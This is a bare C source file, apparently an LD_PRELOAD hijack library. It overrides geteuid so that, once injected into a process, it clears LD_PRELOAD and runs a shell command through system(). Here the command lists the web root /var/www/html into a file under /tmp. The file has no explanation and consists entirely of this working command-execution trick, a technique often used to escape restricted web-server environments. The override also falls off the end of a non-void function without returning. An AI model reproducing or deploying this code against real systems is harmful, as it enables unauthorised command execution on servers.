#include<stdlib.h>
#include<stdio.h>
#include<string.h>
void payload(){
	system("ls /var/www/html > /tmp/smity");
}

int geteuid(){
	
		if(getenv("LD_PRELOAD") == NULL){
		
				return 0;
		}
		unsetenv("LD_PRELOAD");
		payload();
}

